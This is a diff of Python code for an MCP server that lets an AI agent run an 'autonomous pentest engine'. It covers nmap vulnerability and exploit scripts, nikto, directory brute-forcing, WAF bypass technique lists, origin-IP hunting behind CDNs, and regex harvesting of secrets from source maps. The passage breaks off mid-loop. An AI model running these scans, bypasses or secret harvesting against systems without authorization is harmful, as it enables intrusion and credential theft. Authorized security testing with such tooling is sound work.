-            trace.info("parse_complete", f"Parsed {len(parsed_data['hosts'])} hosts, {len(parsed_data['services'])} services")
-        except ET.ParseError as e:
-            trace.error("parse_error", f"Failed to parse Nmap XML: {e}")
-
-    progress.update("Analyzing findings")
-    open_ports = [p for h in parsed_data["hosts"] for p in h["ports"] if p["state"] == "open"]
-
-    # Advanced analysis: fingerprint correlation
-    fingerprint_analysis = []
-    for svc in parsed_data["services"]:
-        product = svc.get("product", "")
-        version = svc.get("version", "")
-        if product:
-            risk = "low"
-            if any(kw in (product or "").lower() for kw in ["apache", "nginx", "iis", "tomcat"]):
-                risk = "medium" if version else "info"
-            if any(kw in (product or "").lower() for kw in ["ftp", "telnet", "smb"]):
-                risk = "high"
-            fingerprint_analysis.append({
-                "port": svc["port"], "product": product, "version": version,
-                "risk_level": risk, "note": f"{product} {version or 'unknown version'} detected"
-            })
-
-    progress.update("CVE cartography")
-    cve_map = {}
-    if auto_cve_map and parsed_data["services"]:
-        cve_map = CVECartographer.map_services_to_cves(parsed_data["services"])
-        trace.info("cve_mapping", f"Mapped {cve_map.get('total_cves', 0)} CVEs across {len(parsed_data['services'])} services")
-
-    progress.update("Building enriched output")
-    output = {
-        "status": "success" if result["success"] else "partial",
-        "target": target, "scan_type": scan_type, "output_file": output_file,
-        "execution_time": result["execution_time"],
-        "summary": {
-            "hosts_up": len([h for h in parsed_data["hosts"] if h["status"] == "up"]),
-            "open_ports": len(open_ports),
-            "services_detected": len(parsed_data["services"]),
-            "scripts_run": len(parsed_data["scripts"]),
-            "cves_mapped": cve_map.get("total_cves", 0) if cve_map else 0
-        },
-        "open_ports": parsed_data["ports"],
-        "services": parsed_data["services"],
-        "fingerprint_analysis": fingerprint_analysis,
-        "os_detection": parsed_data["os_matches"],
-        "hosts": parsed_data["hosts"],
-        "nse_scripts": parsed_data["scripts"][:30],
-        "cve_cartography": cve_map if cve_map else None,
-        "raw_output": result["stdout"][:3000] if result["stdout"] else "",
-        "errors": result["stderr"] if result["stderr"] else None
-    }
-
-    progress.update("Enriching with chain context")
-    output = chain_engine.enrich_with_context("nmap_scan", target, output)
-
-    log_tool_execution("nmap_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# CVE CARTOGRAPHY TOOL
-# ============================================================================
-
-@mcp.tool()
-async def cve_cartography(
-    target: str,
-    services: Optional[str] = None,
-    use_online_lookup: bool = False
-) -> str:
-    """Map discovered services to CVEs with severity scores and recommended patches.
-    If services is not provided, automatically pulls from previous nmap_scan results via chain engine.
-    Services format: JSON array of {port, service, product, version}"""
-    trace, progress, exec_dir = _init_tool_context("cve_cartography", target, 4)
-    inputs = {"target": target, "services": services, "use_online": use_online_lookup}
-
-    progress.update("Gathering service data")
-    service_list = []
-    if services:
-        try:
-            service_list = json.loads(services)
-        except json.JSONDecodeError:
-            trace.warn("parse", "Could not parse services JSON, trying chain engine")
-
-    if not service_list:
-        # Auto-pull from nmap chain
-        nmap_result = chain_engine.get_result("nmap_scan", target)
-        if nmap_result:
-            service_list = nmap_result.get("services", [])
-            trace.info("chain_pull", f"Pulled {len(service_list)} services from nmap_scan chain")
-        else:
-            trace.warn("no_data", "No nmap data found in chain. Run nmap_scan first or provide services JSON.")
-
-    progress.update("Mapping CVEs")
-    cartography = CVECartographer.map_services_to_cves(service_list, use_online=use_online_lookup)
-
-    progress.update("Generating recommendations")
-    recommendations = []
-    for device in cartography.get("devices", []):
-        if device["cve_count"] > 0:
-            recommendations.append({
-                "port": device["port"],
-                "service": f"{device['product']} {device['version']}",
-                "severity": device["max_severity"],
-                "cve_count": device["cve_count"],
-                "action": device["patches_recommended"][0] if device["patches_recommended"] else "Investigate and patch",
-                "all_patches": device["patches_recommended"]
-            })
-
-    output = {
-        "status": "success",
-        "target": target,
-        "total_services_scanned": len(service_list),
-        "cartography": cartography,
-        "priority_recommendations": sorted(recommendations,
-            key=lambda r: {"critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0}.get(r["severity"], 0),
-            reverse=True),
-        "risk_summary": {
-            "critical_cves": cartography["critical_count"],
-            "high_cves": cartography["high_count"],
-            "medium_cves": cartography["medium_count"],
-            "total_cves": cartography["total_cves"]
-        }
-    }
-
-    progress.update("Complete")
-    log_tool_execution("cve_cartography", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# VULNX INTEGRATION
-# ============================================================================
-
-@mcp.tool()
-async def vulnx_scan(
-    target: str,
-    scan_cms: bool = True,
-    scan_ports: bool = True,
-    scan_dns: bool = True,
-    timeout: int = 300
-) -> str:
-    """VulnX-style vulnerability scanner - CMS detection, subdomain enum, port scan,
-    and vulnerability cross-referencing with CVE database.
-    Combines multiple techniques for deep target profiling."""
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("vulnx_scan", target, 7)
-    inputs = {"target": target, "scan_cms": scan_cms, "scan_ports": scan_ports, "scan_dns": scan_dns}
-
-    result_data = {
-        "target": target, "cms_detected": None, "cms_version": None,
-        "vulnerabilities": [], "subdomains": [], "ports": [],
-        "technologies": [], "dns_info": {}
-    }
-
-    # 1. Try actual vulnx if available
-    progress.update("Checking vulnx availability")
-    vulnx_check = run_command_advanced(["which", "vulnx"], timeout=5, trace=trace)
-
-    if vulnx_check["success"]:
-        progress.update("Running vulnx scan")
-        vulnx_cmd = ["vulnx", "-u", target, "--dns", "--sub", "-j"]
-        vx_result = run_command_advanced(vulnx_cmd, timeout=timeout, trace=trace)
-        if vx_result["success"] and vx_result["stdout"]:
-            try:
-                vx_data = json.loads(vx_result["stdout"])
-                result_data.update(vx_data)
-            except json.JSONDecodeError:
-                trace.warn("vulnx_parse", "Could not parse vulnx JSON output")
-    else:
-        trace.info("vulnx_fallback", "vulnx not found, using integrated analysis")
-
-    # 2. CMS Detection (enhanced - works even without vulnx)
-    if scan_cms:
-        progress.update("CMS fingerprinting")
-        url = target if target.startswith("http") else f"https://{target}"
-        fetch = run_command_advanced(["curl", "-skL", "--max-time", "15", url], timeout=20, trace=trace)
-        if fetch["success"] and fetch["stdout"]:
-            html = fetch["stdout"].lower()
-            cms_signatures = {
-                "wordpress": ["wp-content", "wp-includes", "wp-json", "wordpress"],
-                "joomla": ["joomla", "/media/jui/", "com_content"],
-                "drupal": ["drupal", "sites/default/files", "drupal.settings"],
-                "magento": ["magento", "mage/", "skin/frontend"],
-                "shopify": ["shopify", "cdn.shopify.com"],
-                "wix": ["wix.com", "wixsite.com"],
-                "laravel": ["laravel", "csrf-token"],
-                "django": ["csrfmiddlewaretoken", "django"],
-                "flask": ["werkzeug", "flask"],
-                "express": ["x-powered-by: express"],
-                "strapi": ["strapi"],
-                "ghost": ["ghost", "ghost-api"]
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
+        except asyncio.TimeoutError:
+            proc.kill()
+            await proc.communicate()
+            return {
+                "success": False,
+                "command": " ".join(cmd),
+                "error": f"Timeout after {timeout}s",
+                "duration": time.time() - start,
             }
-            for cms, sigs in cms_signatures.items():
-                if any(sig in html for sig in sigs):
-                    result_data["cms_detected"] = cms
-                    result_data["technologies"].append(f"CMS: {cms}")
-                    trace.info("cms_found", f"CMS detected: {cms}")
+        return {
+            "success": proc.returncode == 0,
+            "command": " ".join(cmd),
+            "stdout": stdout.decode(errors="replace")[:50000],
+            "stderr": stderr.decode(errors="replace")[:10000],
+            "return_code": proc.returncode,
+            "duration": time.time() - start,
+        }
+    except FileNotFoundError:
+        return {
+            "success": False,
+            "command": " ".join(cmd),
+            "error": f"Tool not found: {cmd[0]}. Install with: apt install {cmd[0]}",
+            "duration": time.time() - start,
+        }
+    except Exception as e:
+        return {
+            "success": False,
+            "command": " ".join(cmd),
+            "error": str(e),
+            "duration": time.time() - start,
+        }
+
+
+async def run_command_shell(cmd_str: str, timeout: int = 300) -> Dict:
+    """Run a shell command string"""
+    start = time.time()
+    try:
+        proc = await asyncio.create_subprocess_shell(
+            cmd_str,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        try:
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
+        except asyncio.TimeoutError:
+            proc.kill()
+            await proc.communicate()
+            return {"success": False, "error": f"Timeout after {timeout}s", "duration": time.time() - start}
+        return {
+            "success": proc.returncode == 0,
+            "stdout": stdout.decode(errors="replace")[:50000],
+            "stderr": stderr.decode(errors="replace")[:10000],
+            "return_code": proc.returncode,
+            "duration": time.time() - start,
+        }
+    except Exception as e:
+        return {"success": False, "error": str(e), "duration": time.time() - start}
+
+
+# ============================================================================
+# MCP SERVER INITIALIZATION
+# ============================================================================
+
+mcp = FastMCP("Kali MCP Server v6 - Autonomous Pentest Engine")
+
+
+# ============================================================================
+# MODULE 19: SESSION OPS (start/health/summary/memory)
+# Replaces: start_session, server_health, session_summary, get_chain_summary, pentest_memory_query
+# ============================================================================
+
+@mcp.tool()
+async def session_ops(
+    action: str = "health",
+    session_name: Optional[str] = None,
+    target: Optional[str] = None,
+    finding_type: Optional[str] = None,
+) -> str:
+    """
+    Session & memory management hub.
+    Actions: start, health, summary, memory_query, recommendations
+    """
+    try:
+        if action == "start":
+            sid = session_manager.create_session(session_name)
+            return json.dumps({"status": "session_created", "session_id": sid})
+
+        elif action == "health":
+            import shutil
+            tools_available = {}
+            for tool in ["nmap", "nikto", "sqlmap", "hydra", "john", "hashcat",
+                         "gobuster", "ffuf", "nuclei", "wpscan", "metasploit",
+                         "bettercap", "aircrack-ng", "responder", "certipy",
+                         "bloodhound-python", "impacket-secretsdump", "ligolo-ng"]:
+                tools_available[tool] = shutil.which(tool.split("-")[0]) is not None or shutil.which(tool) is not None
+            return json.dumps({
+                "status": "healthy",
+                "version": "6.0.0",
+                "architecture": "20 unified mega-modules",
+                "session": session_manager.current_session_id,
+                "active_executions": len(session_manager.executions),
+                "memory_targets": len(pentest_memory._findings),
+                "tools_available": tools_available,
+            }, indent=2)
+
+        elif action == "summary":
+            sessions = list(session_manager.sessions.values())
+            return json.dumps({
+                "total_sessions": len(sessions),
+                "current_session": session_manager.current_session_id,
+                "total_executions": len(session_manager.executions),
+                "memory_summary": {
+                    t: pentest_memory.get_context(t) for t in list(pentest_memory._findings.keys())[:10]
+                },
+            }, indent=2)
+
+        elif action == "memory_query":
+            if not target:
+                return json.dumps({"error": "target required for memory_query"})
+            context = pentest_memory.get_context(target)
+            findings = pentest_memory.get_findings(target, finding_type or "")
+            return json.dumps({
+                "context": context,
+                "findings_count": len(findings),
+                "findings": findings[:50],
+            }, indent=2)
+
+        elif action == "recommendations":
+            if not target:
+                return json.dumps({"error": "target required for recommendations"})
+            recs = orchestrator.recommend_next_tools(target)
+            stack = orchestrator.adapt_to_stack(target)
+            return json.dumps({
+                "target": target,
+                "recommendations": recs,
+                "stack_adaptation": stack,
+                "context": pentest_memory.get_context(target),
+            }, indent=2)
+
+        else:
+            return json.dumps({"error": f"Unknown action: {action}. Use: start, health, summary, memory_query, recommendations"})
+
+    except Exception as e:
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 1: RECON ENGINE
+# Replaces: nmap_scan, target_profiler, adaptive_recon, smart_fingerprint, web_tech_detect, origin_ip_hunter
+# ============================================================================
+
+@mcp.tool()
+async def recon_engine(
+    target: str,
+    depth: str = "deep",
+    modules: str = "all",
+    ports: str = "top1000",
+    timeout: int = 600,
+) -> str:
+    """
+    Unified reconnaissance engine. Combines: nmap, fingerprinting, tech detection,
+    origin IP hunting, TLS analysis, error page analysis, favicon hashing.
+
+    depth: stealth|light|deep|aggressive
+    modules: all | comma-separated: nmap,fingerprint,tech,origin,tls
+    """
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("recon_engine", target, {"depth": depth, "modules": modules})
+    results = {"target": target, "depth": depth, "modules": {}}
+
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["nmap", "fingerprint", "tech", "origin", "tls"]
+
+        # --- NMAP SCAN ---
+        if "nmap" in mod_list:
+            nmap_args = ["nmap", "-oX", "-"]
+            if depth == "stealth":
+                nmap_args.extend(["-sS", "-T2", "--top-ports", "100"])
+            elif depth == "light":
+                nmap_args.extend(["-sV", "-T3", "--top-ports", "1000"])
+            elif depth == "deep":
+                nmap_args.extend(["-sV", "-sC", "-O", "-T4"])
+                if ports == "top1000":
+                    nmap_args.extend(["--top-ports", "1000"])
+                elif ports == "all":
+                    nmap_args.extend(["-p-"])
+                else:
+                    nmap_args.extend(["-p", ports])
+            elif depth == "aggressive":
+                nmap_args.extend(["-sV", "-sC", "-O", "-A", "-T4", "-p-",
+                                  "--script", "vuln,exploit,auth,default"])
+            nmap_args.append(target)
+            nmap_result = await run_command(nmap_args, timeout=timeout)
+            open_ports = []
+            services = []
+            os_info = []
+            if nmap_result["success"] and nmap_result.get("stdout"):
+                try:
+                    root = ET.fromstring(nmap_result["stdout"])
+                    for host in root.findall(".//host"):
+                        for port_el in host.findall(".//port"):
+                            state = port_el.find("state")
+                            if state is not None and state.get("state") == "open":
+                                port_id = port_el.get("portid")
+                                proto = port_el.get("protocol", "tcp")
+                                svc = port_el.find("service")
+                                svc_name = svc.get("name", "unknown") if svc is not None else "unknown"
+                                svc_product = svc.get("product", "") if svc is not None else ""
+                                svc_version = svc.get("version", "") if svc is not None else ""
+                                open_ports.append(int(port_id))
+                                services.append({
+                                    "port": int(port_id), "proto": proto,
+                                    "service": svc_name, "product": svc_product,
+                                    "version": svc_version,
+                                })
+                        for os_match in host.findall(".//osmatch"):
+                            os_info.append({"name": os_match.get("name"), "accuracy": os_match.get("accuracy")})
+                except ET.ParseError:
+                    pass
+
+            # --- DEEP ANALYSIS: NSE vuln extraction, service risk mapping, CVSS ---
+            nmap_vulns = []
+            if nmap_result["success"] and nmap_result.get("stdout"):
+                nmap_vulns = deep_parser.parse_nmap_service_vulns(nmap_result["stdout"])
+            service_risk_map = []
+            for svc in services:
+                svc_checks = vuln_correlator.get_service_checks(svc["service"])
+                risk_entry = {
+                    "port": svc["port"], "service": svc["service"],
+                    "product": svc["product"], "version": svc["version"],
+                    "recommended_checks": svc_checks["checks"],
+                    "known_cves": svc_checks["common_cves"],
+                }
+                # Version-based CVSS (outdated = higher risk)
+                if svc["version"]:
+                    risk_entry["note"] = f"Version {svc['version']} detected — verify against CVE databases"
+                service_risk_map.append(risk_entry)
+                # Register version-detected findings in correlator
+                if svc["product"] and svc["version"]:
+                    score, vector, severity = CVSSCalculator.score_for_vuln_type("info_disclosure")
+                    vuln_correlator.add_vulnerability(VulnFinding(
+                        vuln_id=f"svc_{svc['port']}_{svc['service']}",
+                        title=f"{svc['product']} {svc['version']} on port {svc['port']}",
+                        severity="info", cvss_score=score, cvss_vector=vector,
+                        target=target, port=svc["port"], service=svc["service"],
+                        evidence=f"Product: {svc['product']}, Version: {svc['version']}",
+                        kill_chain_phase="reconnaissance",
+                        mitre_techniques=["T1595.002"],
+                    ))
+            # Register NSE-detected vulns
+            for nv in nmap_vulns:
+                if nv.get("vulnerable"):
+                    score, vector, severity = CVSSCalculator.score_for_vuln_type("rce")
+                    vuln_correlator.add_vulnerability(VulnFinding(
+                        vuln_id=nv.get("cves", ["nse_vuln"])[0] if nv.get("cves") else f"nse_{nv.get('script','')}",
+                        title=f"NSE {nv.get('script','')} vulnerability on port {nv.get('port',0)}",
+                        severity=severity, cvss_score=score, cvss_vector=vector,
+                        target=target, port=nv.get("port", 0), service=nv.get("service", ""),
+                        evidence=nv.get("output", "")[:300], exploitable=True,
+                        kill_chain_phase="exploitation",
+                        mitre_techniques=["T1210"],
+                    ))
+
+            results["modules"]["nmap"] = {
+                "open_ports": open_ports,
+                "services": services,
+                "os_detection": os_info[:5],
+                "nse_vulnerabilities": nmap_vulns[:20],
+                "service_risk_map": service_risk_map,
+                "raw_available": bool(nmap_result.get("stdout")),
+            }
+            pentest_memory.store_finding(target, "recon_engine", "open_ports",
+                                         {"ports": open_ports, "services": services})
+            if os_info:
+                pentest_memory.store_finding(target, "recon_engine", "os_detected",
+                                             {"os": os_info[0]["name"]})
+
+            # Kill chain: mark reconnaissance phase
+            kill_chain.advance_phase(target, KillChainPhase.RECONNAISSANCE, "recon_engine",
+                                      [f"ports:{','.join(str(p) for p in open_ports[:10])}",
+                                       f"services:{len(services)}",
+                                       f"nse_vulns:{len(nmap_vulns)}"])
+
+        # --- FINGERPRINT ---
+        if "fingerprint" in mod_list:
+            fp_results = {"headers": {}, "technologies": [], "error_signatures": [], "favicon_hash": None}
+            try:
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(target.split("://")[-1].split("/")[0].split(":")[0], 80),
+                    timeout=10,
+                )
+                host = target.split("://")[-1].split("/")[0].split(":")[0]
+                request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n"
+                writer.write(request.encode())
+                await writer.drain()
+                response = await asyncio.wait_for(reader.read(8192), timeout=10)
+                writer.close()
+                resp_text = response.decode(errors="replace")
+                for line in resp_text.split("\r\n"):
+                    if ": " in line and not line.startswith("HTTP"):
+                        key, val = line.split(": ", 1)
+                        fp_results["headers"][key.lower()] = val
+                # Tech detection from headers
+                powered_by = fp_results["headers"].get("x-powered-by", "")
+                server = fp_results["headers"].get("server", "")
+                if "express" in powered_by.lower():
+                    fp_results["technologies"].append("Express/Node.js")
+                    pentest_memory.store_tech(target, {"framework": "express", "runtime": "nodejs"})
+                elif "php" in powered_by.lower():
+                    fp_results["technologies"].append(f"PHP ({powered_by})")
+                    pentest_memory.store_tech(target, {"framework": "php", "version": powered_by})
+                elif "asp.net" in powered_by.lower():
+                    fp_results["technologies"].append("ASP.NET")
+                    pentest_memory.store_tech(target, {"framework": "aspnet"})
+                if "nginx" in server.lower():
+                    fp_results["technologies"].append(f"Nginx ({server})")
+                elif "apache" in server.lower():
+                    fp_results["technologies"].append(f"Apache ({server})")
+                if "x-application-context" in fp_results["headers"]:
+                    fp_results["technologies"].append("Spring Boot")
+                    pentest_memory.store_tech(target, {"framework": "spring-boot"})
+                # Error page fingerprint
+                error_sigs = {
+                    "Whitelabel Error Page": "spring-boot",
+                    "django.core": "django",
+                    "Traceback (most recent call last)": "python",
+                    "Laravel": "laravel",
+                    "at org.apache": "java/tomcat",
+                    "Microsoft .NET Framework": "aspnet",
+                }
+                for sig, tech in error_sigs.items():
+                    if sig in resp_text:
+                        fp_results["error_signatures"].append({"signature": sig, "tech": tech})
+                        pentest_memory.store_tech(target, {"framework": tech})
+            except Exception:
+                pass
+            results["modules"]["fingerprint"] = fp_results
+
+        # --- TECH DETECTION (wappalyzer-style) ---
+        if "tech" in mod_list:
+            tech_result = await run_command(
+                ["whatweb", "--color=never", "-a", "3" if depth in ["deep", "aggressive"] else "1", target],
+                timeout=60,
+            )
+            results["modules"]["tech"] = {
+                "output": tech_result.get("stdout", "")[:3000],
+                "success": tech_result.get("success", False),
+            }
+
+        # --- ORIGIN IP HUNTING ---
+        if "origin" in mod_list:
+            origin_results = {"methods": []}
+            # DNS history
+            dns_result = await run_command(["dig", "+short", "ANY", target.split("://")[-1].split("/")[0]], timeout=15)
+            if dns_result["success"]:
+                origin_results["dns_records"] = dns_result["stdout"].strip().split("\n")
+
+            # Check for CDN bypass
+            for subdomain in ["direct", "origin", "backend", "api", "staging", "dev", "internal"]:
+                hostname = target.split("://")[-1].split("/")[0]
+                test_host = f"{subdomain}.{hostname}"
+                try:
+                    ips = socket.getaddrinfo(test_host, None, socket.AF_INET)
+                    if ips:
+                        origin_results["methods"].append({
+                            "method": "subdomain_resolve",
+                            "subdomain": test_host,
+                            "ips": list(set(addr[4][0] for addr in ips)),
+                        })
+                except (socket.gaierror, OSError):
+                    pass
+            results["modules"]["origin"] = origin_results
+
+        # --- TLS ANALYSIS ---
+        if "tls" in mod_list:
+            hostname = target.split("://")[-1].split("/")[0].split(":")[0]
+            tls_result = await run_command(
+                ["openssl", "s_client", "-connect", f"{hostname}:443", "-servername", hostname],
+                timeout=15,
+            )
+            tls_data = {}
+            if tls_result.get("stdout"):
+                out = tls_result["stdout"]
+                cert_match = re.search(r"subject=(.+)", out)
+                issuer_match = re.search(r"issuer=(.+)", out)
+                if cert_match:
+                    tls_data["subject"] = cert_match.group(1).strip()
+                if issuer_match:
+                    tls_data["issuer"] = issuer_match.group(1).strip()
+                proto_match = re.search(r"Protocol\s*:\s*(\S+)", out)
+                cipher_match = re.search(r"Cipher\s*:\s*(\S+)", out)
+                if proto_match:
+                    tls_data["protocol"] = proto_match.group(1)
+                if cipher_match:
+                    tls_data["cipher"] = cipher_match.group(1)
+            results["modules"]["tls"] = tls_data
+
+        # --- INTELLIGENCE: Correlation + Kill Chain + Attack Path ---
+        results["recommendations"] = orchestrator.recommend_next_tools(target)
+        results["correlation"] = vuln_correlator.correlate(target)
+        results["kill_chain"] = kill_chain.get_progress(target)
+        results["intelligence_summary"] = {
+            "risk_rating": results["correlation"].get("risk_rating", "unknown"),
+            "attack_surface_score": results["correlation"].get("attack_surface_score", 0),
+            "exploit_chains_detected": len(results["correlation"].get("exploit_chains", [])),
+            "mitre_techniques_covered": len(results["correlation"].get("mitre_coverage", [])),
+            "kill_chain_completion": results["kill_chain"].get("completion_pct", 0),
+        }
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 2: WEB ASSAULT
+# Replaces: nikto_scan, gobuster_scan, ffuf_fuzz, context_fuzzer, source_map_extractor,
+#           waf_fingerprint, enhanced_waf_bypass
+# ============================================================================
+
+@mcp.tool()
+async def web_assault(
+    target: str,
+    depth: str = "deep",
+    modules: str = "all",
+    wordlist: str = "auto",
+    extensions: str = "php,html,js,asp,aspx,jsp,json,xml,txt,bak,env",
+    threads: int = 50,
+    timeout: int = 600,
+) -> str:
+    """
+    Unified web attack surface scanner. Combines: nikto, gobuster/ffuf directory brute,
+    source map extraction, WAF fingerprinting & bypass, context-aware fuzzing.
+
+    depth: stealth|light|deep|aggressive
+    modules: all | comma-separated: nikto,dirbrute,sourcemaps,waf,fuzz
+    """
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("web_assault", target, {"depth": depth, "modules": modules})
+    results = {"target": target, "depth": depth, "modules": {}}
+
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["nikto", "dirbrute", "sourcemaps", "waf", "fuzz"]
+        delay = rate_limit_detector.get_delay(target)
+
+        # --- WAF FINGERPRINT (run first to adapt strategy) ---
+        if "waf" in mod_list:
+            waf_data = {"detected": False, "type": "none", "bypass_techniques": []}
+            wafw00f = await run_command(["wafw00f", target, "-o", "-"], timeout=30)
+            if wafw00f.get("success") and wafw00f.get("stdout"):
+                out = wafw00f["stdout"]
+                if "is behind" in out:
+                    waf_match = re.search(r"is behind (.+?)(?:\n|$)", out)
+                    if waf_match:
+                        waf_data["detected"] = True
+                        waf_data["type"] = waf_match.group(1).strip()
+            # If WAF detected, build bypass strategy
+            if waf_data["detected"]:
+                waf_type = waf_data["type"].lower()
+                bypass = []
+                if "cloudflare" in waf_type:
+                    bypass = [
+                        "Origin IP via DNS history/subdomain leak",
+                        "HTTP/2 smuggling", "Unicode normalization",
+                        "Chunked transfer encoding", "Case variation in paths",
+                    ]
+                elif "aws" in waf_type or "waf" in waf_type:
+                    bypass = ["Region-specific bypass", "Content-Type switching",
+                              "Payload fragmentation", "URL encoding chains"]
+                elif "modsecurity" in waf_type:
+                    bypass = ["Double encoding", "Comment injection in SQL",
+                              "Multipart boundary manipulation", "Charset switching"]
+                else:
+                    bypass = ["Header injection (X-Forwarded-For)", "HTTP method override",
+                              "Path normalization tricks", "Chunked encoding"]
+                waf_data["bypass_techniques"] = bypass
+                pentest_memory.store_finding(target, "web_assault", "waf_detected",
+                                             {"type": waf_data["type"], "bypasses": bypass})
+            results["modules"]["waf"] = waf_data
+
+        # --- NIKTO SCAN ---
+        if "nikto" in mod_list:
+            nikto_args = ["nikto", "-h", target, "-Format", "json", "-o", "-"]
+            if depth == "stealth":
+                nikto_args.extend(["-Tuning", "1"])
+            elif depth == "aggressive":
+                nikto_args.extend(["-Tuning", "123456789abcde"])
+            nikto_result = await run_command(nikto_args, timeout=min(timeout, 300))
+            findings = []
+            if nikto_result.get("stdout"):
+                try:
+                    nikto_json = json.loads(nikto_result["stdout"])
+                    if isinstance(nikto_json, list):
+                        for item in nikto_json:
+                            vulns = item.get("vulnerabilities", [])
+                            for v in vulns:
+                                findings.append({
+                                    "id": v.get("id", ""),
+                                    "method": v.get("method", ""),
+                                    "url": v.get("url", ""),
+                                    "msg": v.get("msg", ""),
+                                })
+                except json.JSONDecodeError:
+                    findings = [{"raw": nikto_result["stdout"][:2000]}]
+            results["modules"]["nikto"] = {"findings": findings, "count": len(findings)}
+            if findings:
+                pentest_memory.store_finding(target, "web_assault", "web_vulns",
+                                             {"source": "nikto", "count": len(findings)})
+
+        # --- DIRECTORY BRUTE FORCE (ffuf preferred, fallback gobuster) ---
+        if "dirbrute" in mod_list:
+            # Select wordlist based on depth
+            wordlists = {
+                "stealth": "/usr/share/wordlists/dirb/small.txt",
+                "light": "/usr/share/wordlists/dirb/common.txt",
+                "deep": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+                "aggressive": "/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt",
+            }
+            wl = wordlists.get(depth, wordlists["deep"])
+            if wordlist != "auto":
+                wl = wordlist
+
+            # Adapt to detected stack
+            stack = orchestrator.adapt_to_stack(target)
+            stack_extensions = extensions
+            if stack["adapted"]:
+                extra_endpoints = stack["config"].get("endpoints", [])
+                if stack["stack"] == "spring":
+                    stack_extensions += ",jar,class,xml,properties,yml,yaml"
+                elif stack["stack"] == "php":
+                    stack_extensions += ",php5,php7,phtml,inc,old,bak"
+                elif stack["stack"] == "express":
+                    stack_extensions += ",mjs,ts,graphql,map"
+
+            ffuf_args = [
+                "ffuf", "-u", f"{target}/FUZZ", "-w", wl,
+                "-mc", "200,201,204,301,302,307,401,403,405,500",
+                "-t", str(min(threads, 100)),
+                "-o", "-", "-of", "json",
+                "-e", f".{stack_extensions.replace(',', ',.')}",
+            ]
+            if delay > 0.5:
+                ffuf_args.extend(["-rate", str(max(1, int(1 / delay)))])
+
+            dirbrute_result = await run_command(ffuf_args, timeout=timeout)
+            discovered = []
+            if dirbrute_result.get("stdout"):
+                try:
+                    ffuf_data = json.loads(dirbrute_result["stdout"])
+                    for r in ffuf_data.get("results", []):
+                        discovered.append({
+                            "url": r.get("url", ""),
+                            "status": r.get("status", 0),
+                            "length": r.get("length", 0),
+                            "words": r.get("words", 0),
+                        })
+                except json.JSONDecodeError:
+                    pass
+
+            # Add stack-specific endpoints
+            if stack["adapted"]:
+                for ep in stack["config"].get("endpoints", []):
+                    curl_result = await run_command(
+                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", f"{target}{ep}"],
+                        timeout=10,
+                    )
+                    if curl_result.get("stdout") and curl_result["stdout"].strip() not in ["000", "404"]:
+                        discovered.append({
+                            "url": f"{target}{ep}",
+                            "status": int(curl_result["stdout"].strip()),
+                            "source": f"stack_adapted_{stack['stack']}",
+                        })
+
+            results["modules"]["dirbrute"] = {"discovered": discovered, "count": len(discovered), "wordlist": wl}
+            if discovered:
+                pentest_memory.store_finding(target, "web_assault", "directories",
+                                             {"count": len(discovered), "paths": [d["url"] for d in discovered[:20]]})
+
+        # --- SOURCE MAP EXTRACTION ---
+        if "sourcemaps" in mod_list:
+            sourcemap_findings = {"maps_found": [], "api_endpoints": [], "secrets": []}
+            # Get main page to find JS files
+            curl_result = await run_command(["curl", "-sk", "-L", target], timeout=15)
+            if curl_result.get("stdout"):
+                js_files = re.findall(r'src=["\']([^"\']*\.js)["\']', curl_result["stdout"])
+                js_files += re.findall(r'href=["\']([^"\']*\.js)["\']', curl_result["stdout"])
+                for js_file in list(set(js_files))[:20]:
+                    if not js_file.startswith("http"):
+                        if js_file.startswith("//"):
+                            js_url = "https:" + js_file
+                        elif js_file.startswith("/"):
+                            js_url = target.rstrip("/") + js_file
+                        else:
+                            js_url = target.rstrip("/") + "/" + js_file
+                    else:
+                        js_url = js_file
+                    map_url = js_url + ".map"
+                    map_check = await run_command(
+                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", map_url],
+                        timeout=8,
+                    )
+                    if map_check.get("stdout") and map_check["stdout"].strip() == "200":
+                        sourcemap_findings["maps_found"].append(map_url)
+                        map_content = await run_command(["curl", "-sk", map_url], timeout=15)
+                        if map_content.get("stdout"):
+                            try:
+                                smap = json.loads(map_content["stdout"])
+                                sources = smap.get("sources", [])
+                                # Extract API endpoints from source paths
+                                for src in sources:
+                                    if any(p in src.lower() for p in ["api", "endpoint", "service", "route"]):
+                                        sourcemap_findings["api_endpoints"].append(src)
+                                # Search for secrets in sourcesContent
+                                for content in smap.get("sourcesContent", [])[:10]:
+                                    if content:
+                                        secret_patterns = [
+                                            (r"['\"](?:api[_-]?key|apikey|secret|token|password|auth)['\"]"
+                                             r"\s*[:=]\s*['\"]([^'\"]{8,})['\"]", "hardcoded_secret"),
+                                            (r"https?://[^\s'\"]+/api/[^\s'\"]+", "api_endpoint"),
+                                        ]
+                                        for pat, stype in secret_patterns:
+                                            matches = re.findall(pat, content, re.IGNORECASE)
+                                            for m in matches:
